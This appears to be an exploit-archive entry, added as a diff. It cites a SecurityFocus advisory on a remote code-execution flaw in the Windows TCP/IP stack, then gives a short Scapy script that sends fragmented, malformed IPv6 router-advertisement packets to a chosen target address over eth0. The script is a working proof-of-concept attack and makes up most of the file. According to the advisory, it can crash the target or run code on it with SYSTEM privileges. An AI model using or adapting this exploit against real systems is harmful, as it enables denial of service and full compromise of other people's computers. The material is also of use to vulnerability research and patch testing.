@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/38061/info
+
+Microsoft Windows TCP/IP protocol implementation is prone to a remote code-execution vulnerability.
+
+An attacker can exploit this issue to execute arbitrary code with SYSTEM-level privileges. Successful attacks will completely compromise affected computers. Failed exploit attempts will likely result in denial-of-service conditions. 
+
+
+v6_dst = "<IPv6 address>"
+
+mac_dst = "<Mac address>"
+
+pkt = IPv6(dst=v6_dst, hlim=255) / IPv6ExtHdrFragment() / ICMPv6ND_RA() / ICMPv6NDOptPrefixInfo(len=255, prefixlen=64, prefix="2001::") / Raw(load='A'*2008)
+
+l=fragment6(pkt, 1500)
+
+for p in l:
+sendp(Ether(dst=mac_dst)/p, iface="eth0")
